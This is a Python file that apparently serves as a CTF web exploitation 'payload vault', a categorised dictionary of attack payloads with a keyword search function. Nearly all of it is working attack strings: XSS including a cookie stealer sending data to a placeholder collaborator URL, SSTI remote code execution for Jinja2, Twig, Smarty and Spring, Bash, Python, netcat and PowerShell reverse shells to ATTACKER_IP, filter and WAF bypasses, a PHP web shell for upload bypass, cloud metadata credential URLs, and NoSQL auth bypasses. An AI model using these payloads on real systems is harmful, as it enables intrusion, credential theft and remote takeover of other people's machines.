"""Universal CTF Web Exploitation Payload Vault and Search Engine."""
from typing import Dict, List, Any

PAYLOAD_CATEGORIES: Dict[str, List[Dict[str, str]]] = {
    "XSS (Cross-Site Scripting)": [
        {
            "name": "Classic Script Alert",
            "type": "Basic",
            "payload": "<script>alert(document.domain)</script>",
            "desc": "Standard alert probe for reflected/stored XSS."
        },
        {
            "name": "IMG OnError (No Script Tag)",
            "type": "Filter Bypass",
            "payload": "<img src=x onerror=alert(1)>",
            "desc": "Bypasses filters blocking <script> tags."
        },
        {
            "name": "SVG OnLoad Event",
            "type": "Vector",
            "payload": "<svg onload=alert(document.cookie)>",
            "desc": "SVG based payload without quotes or closing tags."
        },
        {
            "name": "Universal XSS Polyglot",
            "type": "Polyglot",
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
            "desc": "Executes across multiple injection contexts (attribute, tag, script, style)."
        },
        {
            "name": "Cookie Stealer Fetch",
            "type": "Exfiltration",
            "payload": "<script>fetch('http://COLLAB_URL/?c='+encodeURIComponent(document.cookie))</script>",
            "desc": "Exfiltrates document cookies to an out-of-band listener."
        },
        {
            "name": "No-Parentheses Bypass (Throw Error)",
            "type": "WAF Bypass",
            "payload": "<svg onload=window.onerror=eval;throw'=alert\\x281\\x29'>",
            "desc": "Executes alert when parentheses () are blocked by WAF."
        },
        {
            "name": "Autofocus / OnFocus Interaction-Free",
            "type": "Vector",
            "payload": "<input autofocus onfocus=alert(1)>",
            "desc": "Fires immediately on page load via autofocus."
        }
    ],
    "SSTI (Server-Side Template Injection)": [
        {
            "name": "Jinja2 / Flask: Basic Math Verification",
            "type": "Detection",
            "payload": "{{7*7}}",
            "desc": "Returns 49 if vulnerable to Jinja2 / Twig."
        },
        {
            "name": "Jinja2 / Flask: RCE via os.popen",
            "type": "RCE",
            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "desc": "Direct RCE via config globals dictionary."
        },
        {
            "name": "Jinja2 / Flask: RCE via Subclasses (No Config)",
            "type": "RCE",
            "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag*',shell=True,stdout=-1).communicate()[0].strip()}}",
            "desc": "RCE via object subclasses traversal (subprocess.Popen index may vary)."
        },
        {
            "name": "Jinja2 / Flask: Filter Bypass (No Quotes / Underlines)",
            "type": "WAF Bypass",
            "payload": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "desc": "Evades keyword and underscore filters."
        },
        {
            "name": "Twig (PHP): RCE via _self.env",
            "type": "RCE",
            "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "desc": "Twig 1.x RCE execution."
        },
        {
            "name": "Smarty (PHP): Direct PHP Tag RCE",
            "type": "RCE",
            "payload": "{php}system('id');{/php}",
            "desc": "Executes PHP directly in Smarty templates."
        },
        {
            "name": "Java Spring / Thymeleaf: Expression Execution",
            "type": "RCE",
            "payload": "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
            "desc": "Executes commands via Spring Expression Language (SpEL)."
        }
    ],
    "Command Injection & Reverse Shells": [
        {
            "name": "Bash TCP Reverse Shell",
            "type": "Reverse Shell",
            "payload": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "desc": "Classic interactive Bash reverse shell."
        },
        {
            "name": "Python3 Standalone Reverse Shell",
            "type": "Reverse Shell",
            "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            "desc": "Full PTY reverse shell via Python 3."
        },
        {
            "name": "Netcat (mkfifo) Reverse Shell",
            "type": "Reverse Shell",
            "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f",
            "desc": "Works when traditional 'nc -e' is disabled."
        },
        {
            "name": "PowerShell Windows Reverse Shell",
            "type": "Reverse Shell",
            "payload": "$c = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$o = (iex $d 2>&1 | Out-String );$o2  = $o + 'PS ' + (pwd).Path + '> ';$x = ([text.encoding]::ASCII).GetBytes($o2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()",
            "desc": "Pure PowerShell TCP reverse shell without external tools."
        },
        {
            "name": "Space Bypass (${IFS})",
            "type": "WAF Bypass",
            "payload": ";cat${IFS}/flag.txt;",
            "desc": "Replaces spaces with internal field separator variable."
        },
        {
            "name": "Base64 Pipeline Shell",
            "type": "WAF Bypass",
            "payload": ";echo${IFS}Y2F0IC9mbGFnKgo=|base64${IFS}-d|sh;",
            "desc": "Executes base64-encoded command string (cat /flag*)."
        }
    ],
    "File Upload Bypasses": [
        {
            "name": "Alternate PHP Extensions",
            "type": "Extension",
            "payload": "shell.phtml, shell.php5, shell.php7, shell.phar, shell.inc, shell.phps",
            "desc": "Common alternate extensions recognized by PHP handlers."
        },
        {
            "name": "Double Extension / Null Byte",
            "type": "Extension",
            "payload": "shell.php.png, shell.php%00.png, shell.php;.jpg",
            "desc": "Evades naive extension validation."
        },
        {
            "name": "MIME Type Spoofing",
            "type": "Header",
            "payload": "Content-Type: image/png\nContent-Type: image/jpeg\nContent-Type: image/gif",
            "desc": "Spoofs Content-Type header in multipart uploads."
        },
        {
            "name": "GIF89a Magic Bytes Header",
            "type": "Polyglot",
            "payload": "GIF89a;\n<?php system($_GET['cmd']); ?>",
            "desc": "Prepends valid GIF magic bytes to bypass image validation."
        },
        {
            "name": ".htaccess Upload (Execute PNG as PHP)",
            "type": "Config Overwrite",
            "payload": "AddType application/x-httpd-php .png",
            "desc": "Uploads .htaccess configuration forcing web server to execute .png files as PHP."
        },
        {
            "name": ".user.ini Auto-Prepend",
            "type": "Config Overwrite",
            "payload": "auto_prepend_file=shell.png",
            "desc": "Configures PHP-FPM / FastCGI to automatically include shell.png on every request."
        }
    ],
    "SSRF & Cloud Metadata": [
        {
            "name": "AWS EC2 Metadata (IMDSv1)",
            "type": "Cloud",
            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "desc": "Extracts IAM instance profile role and temporary credentials."
        },
        {
            "name": "Google Cloud Platform (GCP) Metadata",
            "type": "Cloud",
            "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "desc": "Extracts GCP service account OAuth token (requires Metadata-Flavor: Google header)."
        },
        {
            "name": "Azure Instance Metadata Service",
            "type": "Cloud",
            "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "desc": "Extracts Azure VM metadata (requires Metadata: true header)."
        },
        {
            "name": "Localhost IP Representations (WAF Bypass)",
            "type": "Bypass",
            "payload": "http://127.0.0.1 | http://2130706433 (Decimal) | http://0177.0000.0000.0001 (Octal) | http://0x7f000001 (Hex) | http://[::1] (IPv6) | http://127.1",
            "desc": "Various representations of 127.0.0.1 to bypass keyword filters."
        }
    ],
    "NoSQL Injection": [
        {
            "name": "JSON Body Not-Equal Bypass",
            "type": "Auth Bypass",
            "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
            "desc": "MongoDB operator injection in JSON payload."
        },
        {
            "name": "URL-Encoded Not-Equal Operator",
            "type": "Auth Bypass",
            "payload": "username[$ne]=admin&password[$ne]=admin",
            "desc": "MongoDB parameter array injection."
        },
        {
            "name": "Regex Password Extraction",
            "type": "Blind Extraction",
            "payload": "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a.*\"}}",
            "desc": "Extracts password character-by-character via regex matching."
        }
    ]
}

def search_payloads(query: str) -> List[Dict[str, Any]]:
    """Searches across all categories and payloads."""
    q = query.lower().strip()
    results = []
    for cat, items in PAYLOAD_CATEGORIES.items():
        for item in items:
            if (not q or q in cat.lower() or q in item["name"].lower()
                    or q in item["type"].lower() or q in item["desc"].lower()
                    or q in item["payload"].lower()):
                results.append({
                    "category": cat,
                    "name": item["name"],
                    "type": item["type"],
                    "payload": item["payload"],
                    "desc": item["desc"]
                })
    return results
